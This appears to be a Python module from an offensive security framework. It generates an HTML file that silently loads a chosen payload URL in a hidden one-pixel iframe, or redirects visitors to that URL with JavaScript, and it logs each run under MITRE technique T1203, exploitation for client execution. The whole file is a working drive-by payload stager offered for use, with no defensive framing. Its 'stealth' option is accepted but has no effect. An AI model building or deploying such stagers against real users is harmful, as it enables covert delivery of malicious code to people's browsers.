# modules/exploits/html_payload_stager.py

import argparse
import os
from datetime import datetime
import json

PAYLOAD_OUT = "results/web/staged_payload.html"
LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1203"  # Exploitation for Client Execution

def log_stager(entry):
    os.makedirs("results/web", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def create_payload(url, js_redirect=False, stealth=False):
    if js_redirect:
        content = f"""<html><head><script>window.location="{url}";</script></head><body></body></html>"""
    else:
        content = f"""<html><body><iframe src="{url}" width="1" height="1" style="border:none;"></iframe></body></html>"""

    with open(PAYLOAD_OUT, "w") as f:
        f.write(content)

    log_stager({
        "timestamp": datetime.utcnow().isoformat(),
        "payload_url": url,
        "file": PAYLOAD_OUT,
        "redirect": js_redirect,
        "stealth": stealth,
        "ttp": MITRE_TTP
    })

    print(f"[âœ“] Payload staged to {PAYLOAD_OUT}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTML Payload Stager")
    parser.add_argument("--url", required=True, help="Payload or redirect URL")
    parser.add_argument("--redirect", action="store_true", help="Use JS redirect instead of iframe")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    create_payload(args.url, args.redirect, args.stealth)
